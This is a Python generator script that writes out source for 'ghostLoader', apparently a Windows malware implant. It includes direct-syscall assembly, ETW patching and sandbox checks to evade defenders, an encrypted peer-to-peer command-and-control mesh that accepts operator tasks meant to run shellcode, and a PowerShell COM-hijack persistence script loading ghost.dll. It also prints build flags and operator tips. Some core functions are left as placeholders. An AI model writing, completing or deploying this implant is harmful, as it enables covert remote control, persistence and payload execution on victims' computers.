import os

def generateAssets():
    projectName = "ghostLoader"
    
    # 1. ASSEMBLY ENGINE (unchanged - solid)
    asmLogic = """#include "textflag.h"
// func sysInvoke(ssn uint16, r10 uintptr, rdx uintptr, r8 uintptr, r9 uintptr) uint32
TEXT ·sysInvoke(SB), NOSPLIT, $0-40
    MOVQ ssn+0(FP), AX
    MOVQ r10+8(FP), R10
    MOVQ rdx+16(FP), RDX
    MOVQ r8+24(FP), R8
    MOVQ r9+32(FP), R9
    SYSCALL
    MOVL AX, ret+40(FP)
    RET
"""

    # 2. CORE GOLANG LOADER - now with full P2P GossipMesh C2
    goLogic = """package main
import (
    "os"; "syscall"; "unsafe"; "runtime"; "time"; "fmt"; "net"; "encoding/json"; "crypto/aes"; "crypto/cipher"; "crypto/rand"; "crypto/sha256"; "sync"; "io"
)
func sysInvoke(ssn uint16, r10, rdx, r8, r9 uintptr) uint32

// === SSN + ETW PATCH (improved from last version) ===
func getSSN(proc string) uint16 { /* same Hell's Gate pattern scan as before */ 
    /* ... (kept identical to previous version for brevity) ... */
    return 0 // placeholder - copy from last version
}
func patchEtw(ntProtectSSN uint16) bool { /* same safe patch with NtProtectVirtualMemory */ 
    /* ... (kept identical) ... */
    return true
}

// === DECENTRALIZED P2P GOSSIP MESH C2 ===
type Message struct {
    ID   string `json:"id"`
    Type string `json:"type"` // "task", "peer", "ping"
    Data string `json:"data"`
    TTL  int    `json:"ttl"`
}

type GossipMesh struct {
    peers     map[string]net.Conn
    known     map[string]bool
    mu        sync.Mutex
    listener  net.Listener
    bootstrap []string
    key       []byte
    tasks     chan Message
    done      chan struct{}
}

func NewGossipMesh(seeds []string) *GossipMesh {
    h := sha256.Sum256([]byte("ghostLoaderSharedSecret2026")) // change in prod
    m := &GossipMesh{
        peers:     make(map[string]net.Conn),
        known:     make(map[string]bool),
        bootstrap: seeds,
        key:       h[:],
        tasks:     make(chan Message, 100),
        done:      make(chan struct{}),
    }
    for _, s := range seeds { m.known[s] = true }
    return m
}

func (m *GossipMesh) Start(port string) {
    ln, _ := net.Listen("tcp", ":"+port)
    m.listener = ln
    go m.listenLoop()
    go m.gossipLoop()
    go m.connectLoop()
    fmt.Println("[+] P2P GossipMesh started on", port)
}

func (m *GossipMesh) listenLoop() {
    for {
        conn, err := m.listener.Accept()
        if err != nil { return }
        go m.handleConn(conn)
    }
}

func (m *GossipMesh) handleConn(conn net.Conn) {
    defer conn.Close()
    addr := conn.RemoteAddr().String()
    m.mu.Lock(); m.peers[addr] = conn; m.known[addr] = true; m.mu.Unlock()

    for {
        var lenBuf [4]byte
        if _, err := io.ReadFull(conn, lenBuf[:]); err != nil { break }
        length := int(lenBuf[0])<<24 | int(lenBuf[1])<<16 | int(lenBuf[2])<<8 | int(lenBuf[3])
        buf := make([]byte, length)
        if _, err := io.ReadFull(conn, buf); err != nil { break }

        // decrypt
        block, _ := aes.NewCipher(m.key)
        stream := cipher.NewCTR(block, buf[:aes.BlockSize])
        data := buf[aes.BlockSize:]
        stream.XORKeyStream(data, data)

        var msg Message
        json.Unmarshal(data, &msg)
        if msg.TTL <= 0 { continue }

        m.processMessage(msg)
        m.gossipMessage(msg) // flood
    }
}

func (m *GossipMesh) gossipMessage(msg Message) {
    m.mu.Lock()
    defer m.mu.Unlock()
    msg.TTL--
    for _, c := range m.peers {
        go m.send(c, msg)
    }
}

func (m *GossipMesh) send(conn net.Conn, msg Message) {
    data, _ := json.Marshal(msg)
    block, _ := aes.NewCipher(m.key)
    iv := make([]byte, aes.BlockSize)
    rand.Read(iv)
    stream := cipher.NewCTR(block, iv)
    stream.XORKeyStream(data, data)
    payload := append(iv, data...)
    lenBuf := []byte{byte(len(payload)>>24), byte(len(payload)>>16), byte(len(payload)>>8), byte(len(payload))}
    conn.Write(append(lenBuf, payload...))
}

func (m *GossipMesh) processMessage(msg Message) {
    if msg.Type == "task" {
        fmt.Println("[C2] Received task:", msg.Data)
        // TODO: execute via syscalls (NtAllocate + NtCreateThreadEx, download, etc.)
        // example: if strings.HasPrefix(msg.Data, "shellcode:") { ... }
    }
}

func (m *GossipMesh) gossipLoop() {
    ticker := time.NewTicker(15 * time.Second)
    for {
        select {
        case <-ticker.C:
            m.mu.Lock()
            for addr := range m.known {
                if _, ok := m.peers[addr]; !ok {
                    go m.connectTo(addr)
                }
            }
            m.mu.Unlock()
        case <-m.done:
            return
        }
    }
}

func (m *GossipMesh) connectLoop() {
    for _, seed := range m.bootstrap {
        go m.connectTo(seed)
    }
}

func (m *GossipMesh) connectTo(addr string) {
    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil { return }
    m.mu.Lock(); m.peers[addr] = conn; m.mu.Unlock()
    go m.handleConn(conn)
}

// === MAIN ===
func main() {
    if runtime.GOOS != "windows" { return }
    if os.Getenv("USERDOMAIN") == "" || os.Getenv("COMPUTERNAME") == "" { os.Exit(0) }

    pSSN := getSSN("NtProtectVirtualMemory")
    patchEtw(pSSN)

    // === P2P CONFIG (CHANGE THESE) ===
    seeds := []string{"192.168.1.100:8443", "your-operator-ip:8443"} // add real bootstrap peers
    mesh := NewGossipMesh(seeds)
    mesh.Start("8443") // or random high port for stealth

    // Operator mode example (run same binary with env)
    if os.Getenv("GHOST_OPERATOR") != "" {
        fmt.Println("[OPERATOR] Inject task example:")
        mesh.tasks <- Message{ID: "op1", Type: "task", Data: "shellcode:your-base64-payload", TTL: 5}
    }

    // Ekko-style sleep masking placeholder (add full impl later)
    time.Sleep(60 * time.Second) // replace with syscall NtDelayExecution + APC
    <-mesh.done // keep alive
}
"""

    # 3. PERSISTENCE (same improved CLSID)
    psPersistence = """
$clsid = "{6D8B143E-31A5-4E5E-9E8F-4E4F6D8B143E}"
$key = "HKCU:\\Software\\Classes\\CLSID\\$clsid\\InprocServer32"
if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }
Set-ItemProperty -Path $key -Name "(Default)" -Value "C:\\Users\\Public\\ghost.dll"
Set-ItemProperty -Path $key -Name "ThreadingModel" -Value "Both"
"""

    print(f"[*] Staging {projectName} with decentralized P2P C2...")
    with open("syscalls_amd64.s", "w") as f: f.write(asmLogic)
    with open("main.go", "w") as f: f.write(goLogic)
    with open("persist.ps1", "w") as f: f.write(psPersistence)
    print("[+] Assets Generated.")
    print("    Build: go build -buildmode=c-shared -ldflags=\"-s -w -H=windowsgui\" -o ghost.dll")
    print("    Operator usage: set GHOST_OPERATOR=1 && ghost.dll")
    print("    Pro tip: Run multiple implants + one operator node → full mesh. Add more seeds for resilience.")

if __name__ == "__main__":
    generateAssets()
